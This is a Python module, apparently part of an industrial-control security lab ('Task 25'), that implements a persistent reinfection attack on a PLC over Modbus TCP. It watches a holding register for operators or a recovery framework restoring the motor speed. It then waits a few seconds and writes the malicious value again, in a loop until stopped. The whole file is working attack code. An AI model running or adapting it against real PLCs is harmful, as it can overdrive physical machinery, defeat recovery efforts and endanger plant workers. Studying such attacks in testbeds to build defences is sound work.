"""
Reinfection attack (Task 25).

Watches the PLC for a restoration (motor flag back to 1, counter reset,
or speed restored). When it sees one, it waits `reinfect_delay_s`
seconds (default 5) and re-corrupts the register. Runs until stopped.
"""
import logging
import threading
import time
from datetime import datetime

from pymodbus.client import ModbusTcpClient

from .logger import get_attack_logger


log = get_attack_logger("attack.reinfect")


# Register map
MW_MOTOR   = 0
MW_SPEED   = 1
MW_TIMER   = 2
MW_COUNT   = 3
MW_STATUS  = 4
MW_SENSOR  = 5


class ReinfectionAttack:
    """
    Waits for a restoration, then waits `reinfect_delay_s`, then
    re-corrupts the target register. Repeats until stopped.
    """

    name = "attack.reinfect"

    def __init__(
        self,
        plc_ip: str,
        modbus_port: int = 502,
        target_register: int = MW_SPEED,
        attack_value: int = 12000,
        healthy_value: int = 500,
        reinfect_delay_s: float = 5.0,
        poll_interval_s: float = 0.5,
    ):
        self.plc_ip = plc_ip
        self.modbus_port = modbus_port
        self.target_register = target_register
        self.attack_value = attack_value
        self.healthy_value = healthy_value
        self.reinfect_delay_s = reinfect_delay_s
        self.poll_interval_s = poll_interval_s

        self._stop = threading.Event()
        self._thread: threading.Thread | None = None
        self._cycles = 0
        self._events: list[dict] = []

    # --- lifecycle ---------------------------------------------------------

    def start(self):
        if self._thread and self._thread.is_alive():
            log.warning(f"{self.name}: already running")
            return False
        self._stop.clear()
        self._thread = threading.Thread(target=self._run, daemon=True)
        self._thread.start()
        log.info(
            f"{self.name}: STARTED (target=MW{self.target_register}, "
            f"reinfect_delay={self.reinfect_delay_s}s)"
        )
        return True

    def stop(self):
        if not self._thread:
            return False
        self._stop.set()
        self._thread.join(timeout=3)
        log.info(f"{self.name}: STOPPED after {self._cycles} reinfection cycles")
        return True

    def is_running(self):
        return bool(self._thread and self._thread.is_alive())

    def events(self):
        return list(self._events)

    # --- helpers -----------------------------------------------------------

    def _connect(self):
        c = ModbusTcpClient(self.plc_ip, port=self.modbus_port)
        c.connect()
        if not c.connected:
            raise ConnectionError(
                f"cannot reach PLC at {self.plc_ip}:{self.modbus_port}"
            )
        return c

    def _read(self, c, addr):
        return c.read_holding_registers(address=addr, count=1).registers[0]

    def _write(self, c, addr, value):
        c.write_register(address=addr, value=value)

    def _log_cycle(self, phase: str, detail: str):
        entry = {
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "phase": phase,
            "detail": detail,
            "cycle": self._cycles,
        }
        self._events.append(entry)
        log.info(f"{self.name}: [{phase}] {detail}")

    # --- main loop ---------------------------------------------------------

    def _run(self):
        last_seen_value = None

        while not self._stop.is_set():
            try:
                c = self._connect()
            except Exception as e:
                log.error(f"{self.name}: connect failed: {e}")
                self._stop.wait(self.poll_interval_s)
                continue

            try:
                current = self._read(c, self.target_register)
            except Exception as e:
                log.error(f"{self.name}: read failed: {e}")
                c.close()
                self._stop.wait(self.poll_interval_s)
                continue
            finally:
                try:
                    c.close()
                except Exception:
                    pass

            # detect the restoration edge:
            # we expect the register to be at attack_value while corrupted,
            # and go back to healthy_value when the framework restores it.
            restoration_seen = (
                last_seen_value == self.attack_value
                and current == self.healthy_value
            )

            if restoration_seen:
                self._log_cycle(
                    "restoration_detected",
                    f"MW{self.target_register} {last_seen_value} -> {current}",
                )
                log.info(
                    f"{self.name}: waiting {self.reinfect_delay_s}s "
                    f"before reinfection..."
                )
                if self._stop.wait(self.reinfect_delay_s):
                    break

                # reinfect
                try:
                    c = self._connect()
                    try:
                        self._write(
                            c, self.target_register, self.attack_value,
                        )
                        self._cycles += 1
                        self._log_cycle(
                            "reinfected",
                            f"MW{self.target_register} -> {self.attack_value}",
                        )
                    finally:
                        c.close()
                except Exception as e:
                    log.error(f"{self.name}: reinfection failed: {e}")

                # refresh last_seen_value now that we've re-attacked
                last_seen_value = self.attack_value
            else:
                last_seen_value = current

            self._stop.wait(self.poll_interval_s)